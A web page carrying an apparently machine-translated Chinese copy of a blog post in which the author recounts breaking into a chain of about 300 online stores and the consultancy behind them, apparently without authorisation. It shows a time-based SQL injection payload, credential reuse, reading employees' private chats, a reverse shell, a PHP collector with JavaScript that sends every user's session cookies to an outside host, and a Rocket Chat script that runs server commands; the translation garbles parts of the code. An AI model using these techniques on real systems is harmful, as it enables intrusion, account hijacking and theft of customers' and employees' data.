<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>我妥协了 300 家商店和一家“西班牙咨询公司”</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">我妥协了 300 家商店和一家“西班牙咨询公司”</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2021-08-06 07:38:17</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2021/8/560b26d4abab748aeade6e205dcde5e3.jpeg"><img src="http://img2.diglog.com/img/2021/8/560b26d4abab748aeade6e205dcde5e3.jpeg" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>关于我如何妥协 300 家商店和一家“西班牙咨询公司”的故事。你知道，我在网上商店比较我想买的东西的价格。我无聊。我打开了 Wappalyzer：Apache 2.4.46、Amazon EC2、PHP。好的！这一切都始于“让我们看看这个网站是否容易受到某些东西的影响”。我不会发布名字，我会尽量避免任何提示。有关漏洞和错误配置的报告仍在进行中，因此某些问题可能尚未在所有地方修复。它不是 Wordpress 或其他类型的 CMS，好吧……我检查了 robots.txt。我找到了一个可以登录的面板……我尝试了默认凭据，例如 admin/admin 等，但是没有用。阅读登录面板的页脚，我发现了两件事。这家店是一家拥有300多家店的连锁店的一部分，CMS/Platform（不知道怎么称呼）是同一家公司做的。稍微“谷歌搜索”确认一下，我发现所有这些都有相同的“CMS”，相同的登录面板，只有一些差异，如 CSS、语言等。如果他们都有共同的凭据怎么办?看起来很有希望！ 😅 让我们扫描此服务器的端口以获取更多信息。端口 21 打开 ftp vsftpd 2.2.2 端口 22 打开 ssh OpenSSH 7.4 端口 80 打开 http Apache httpd 2.4.48 Amazon OpenSSL/1.0.2k-fips PHP/7.1.33 端口 443 打开 ssl Apache httpd 我将文件扫描导出到了解服务器上运行的服务。</p><p>我总是先尝试基本的东西。我在搜索栏上尝试了一些反射/持久性 XSS、SQL 注入等。 URL中有一些参数，所以我想我可以在那里注入代码，但一开始我没有成功。那一刻我想：“好吧……也许构建这个自定义 CMS 的人正在清理参数，或者使用我不知道的一些框架，在幕后为他们做这件事”。并不真地。你以前读过关于基于时间的 SQL 盲注攻击吗？搜索栏有一些过滤器可以应用，所以我尝试了一些东西，BINGO！ 😎 神奇的事情发生在 ; SELECT SLEEP(5)# 你可以在谷歌上搜索更多。这里重要的是，我能够转储数据库。我期待只有几个表，与站点相关的表，但令我惊讶的是，我之前在登录面板上看到的只有一个带有此链名称的模式。这个模式包含三千多个表，是的，超过 3000 个表。在这一点上，我花一些时间试图找出表格。其中一些用英语，另一些用西班牙语，理论上也是临时表，但有趣的是：Usuarios。我从该表中下载了数据，以及潜在管理员用户、电子邮件、电话、当时我不理解的一些令牌等的列表。至少密码是经过哈希处理的。这时候我有点难过。心想：“嗯……到此为止了。我发现了一个 SQL 注入，有很多数据，但没有别的。”我的女朋友和我的狗建议我离开电脑，所以我去睡觉了。 🌖 我一直在寻找励志名言把它放在这里，但我只是想出了这个：我没有走在正确的道路上。我不得不想办法解决其他问题。我醒来后，用“Usuarios”表中的数据创建了一个字典。实际上，不需要蛮力。我在第一次尝试时就得到了它。跆拳道？严重地？ 🤯 我在不到 1 分钟的时间内以超级管理员的身份访问了仪表板。这家伙的密码和他的用户名一样。好的！ 👏🏼 我无法上传它的图片，但可以想象一下仪表板的通用 Bootstrap 模板。我可以访问所有内容：订单、折扣、产品、客户、新闻/帖子、时事通讯等，并且我有权做我想做的一切。</p><p>这是这家公司的普遍做法吗？是的。我还没有尝试过这 300 家商店，但我以超级管理员身份登录了其中的一些商店，并且能够使用相同的凭据登录到不属于连锁店的其他网页。我很幸运。我的意思是，最后，它可能只是 SQL 注入，但你知道……“人类是网络安全链中最薄弱的环节。”我想给这些人写一封电子邮件，让他们知道他们代码中的漏洞以及他们的不良做法，但此时我没有。我觉得我能够找到更多关于这家公司的东西。我以前在咨询公司工作，通常这些公司参与的项目不止一个。于是，我打开浏览器，开始对这家公司做一些“OSINT”。 - 该公司参与的项目从“concursos públicos”获得资金。 - （例如，他们的“自治自治”项目。） - CMS 不仅仅在 300 家商店中使用。 - 它也在其他项目中重复使用，是的，我发现的凭据仍然有效。 - 该公司提供不同的（易受攻击的）产品，其中一些作为 SAAS。还有更多的东西，但如果可能的话，我想保持这篇文章的简短。在这一点上，我对这家公司有了一些了解。我试图找到子域，其中一个可能引起了我的注意。该公司在子域下使用 Rocket Chat（类似于 Slack），您不需要任何 VPN/2FA/任何登录。找出凭据！嗯你是对的！ 😉 我们的凭据也适用于聊天，我们的家伙拥有管理员角色。好吧，我进去了！ 🍾🥂 可以说我在公司里面。在这一点上，我能够阅读与员工的私人谈话，在公共频道/私人谈话中找到的话，看看他们对客户的评价……我想要什么……最后，我以他们的老板的身份登录，并且他具有管理员角色。</p><p>如果我们看一下我上面写的端口扫描，我们已经打开了 21/22 端口，对吗？因此，让我们尝试在私人对话中查找凭据。是的，我有 FTP 和 SSH 凭据！在这一点上，我能够上传/下载/修改代码，实际上，这就是我找到数据库主机 + 凭据的方式，因为您可能知道，如果您不使用，在某些配置文件中拥有凭据是很常见的，idk 、AWS Secrets Manager 或类似的东西。用户在这里写他们的信用卡。你了解这一切的风险吗？无论如何......我能够获得一个反向shell并查看服务器。拥有管理员凭据，这本身就很重要。我的意思是，我可以阅读他们关于所有事情的对话。但是，我们没有每个人的凭据，看起来有些员工没有遵循不良做法，因此他们的密码不是他们的用户名。不用担心，多一点“谷歌搜索”，我们可以解决这个问题！ Rocket Chat 允许您在 JavaScript 中创建自定义脚本。我是管理员，所以，我可以做到！它的想法是创建一个脚本，该脚本在某处发出请求以保存 rc_uid 和 rc_token。在这一点上，你必须“有创意？”。让我们创建一个简单的 PHP 脚本并将其部署到某个地方：</p><p>&lt;?php $filename = &#39;info.txt&#39; ; if ( isset( $_REQUEST[ &#39;cookie&#39;]) &amp;&amp; isset( $_REQUEST[ &#39;user&#39;])) { $text = $_REQUEST[ &#39;user&#39;] . &quot;:&quot; 。 $_REQUEST[&#39;cookie&#39;]。 &quot; \n &quot; ; if ( is_writable( $filename)) { if ( ! $handle = fopen( $filename , &#39;a&#39;)) { echo &quot;cannot open file ( $filename)&quot; ;出口 ; } if ( fwrite( $handle , $text) === FALSE) { echo &quot;无法写入文件 ( $filename )&quot; ;出口 ; } 回声“成功”； fclose($handle); } else { echo &quot;文件 $filename 不可写&quot;; } } // 添加你的脚本 let c = document .曲奇饼 。 split( &#39;;&#39;) 让 u = 文档。 querySelector( &#39;.avatar-image&#39;) 。源文件。 split( &#39;/&#39;)[ 4] fetch( &quot;https://urlOfOurPHPScript.com/index.php?cookie=&quot; +c + &quot;&amp;user=&quot; +u + &quot;&quot;) 。然后((r) =&gt; r . json()) 。然后((数据) =&gt; {}) 。 catch((e) =&gt; {}) ;而已！我们最终会得到一个包含每个人的 cookie 的文件。它应该是这样的： 我们现在可以在浏览器中修改本地存储和 cookie。刷新它，我们将拥有您选择的用户的会话。管理员很容易劫持您的帐户，不是吗？如果您使用 Rocket Chat，请注意你们对老板的评价，以防万一！ 😅 要了解有关此步骤的更多信息，请参阅本故事的最后一个。我推荐原帖。这个简单的有效载荷有效，因此我能够查看运行火箭聊天的实例内部。</p><p>const 要求 = 控制台。 log(&#39;返回 process.mainModule.require&#39;)(); const { spawnSync } = require(&#39;child_process&#39;); const ls = spawnSync( &#39;ls&#39; , [ &#39;-la&#39; , &#39;/&#39;]) ; class Script { process_incoming_request({ request }) { return { content : { text : ls .标准输出。 toString() } } } } 这篇文章旨在向人们展示他们的数据在某些环境中如何容易被盗，以及公司如何忘记关于网络安全的最低水平的良好实践。最后，我很幸运，凭据薄弱，这是让我能够继续所有这些的重要一点。正如我所说，这篇文章是为了提高认识，而不是指出任何公司的开发人员、管理员等。 SSL 是不够的。如您所见，也许您在其中一家商店中写入了信用卡/个人数据。出于安全目的，此报告将不包含名称。即使这一切都解决了，我也会保持它现在的样子。</p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://edbrsk.dev/content/real-cases/how-I-compromised-300-stores-and-a-spanish-consultancy">https://edbrsk.dev/content/real-cases/how-I-compromised-300-stores-and-a-spanish-consultancy</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/咨询/">#咨询</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/spanish/">#spanish</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/谷歌/">#谷歌</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy;2012-2021 diglog.com </div></div></body></html>